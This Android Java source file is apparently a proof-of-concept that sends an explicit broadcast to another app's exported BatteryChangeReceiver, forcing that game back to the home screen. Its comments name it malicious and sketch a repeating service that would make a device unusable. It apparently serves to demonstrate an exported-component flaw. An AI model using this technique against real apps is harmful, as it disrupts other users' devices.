package com.example.hsiehj.gamekillbuttonapp;

import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;

import android.content.Intent;
import android.content.ComponentName;

public class MainActivity extends AppCompatActivity {

    public static String gamePackage = "com.example.amazed";
    public static String gamePackageReceiver = gamePackage + ".BatteryChangeReceiver";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Pressing me sends you back to the home screen", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();

                // since the receiver listens to system broadcasts, it is exported and accessible to
                // a malicious app like this one
                // since the receiver takes you to the home screen to shut down the game when it receives
                // an intent, pressing this button will take you back to the homescreen
                // this would be particularly malicious as a service that ran every couple of seconds
                // it would render a device practically unusable, jumping to the home screen constantly
                final Intent intent= new Intent();
                intent.setComponent(new ComponentName(gamePackage, gamePackageReceiver));
                sendBroadcast(intent);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
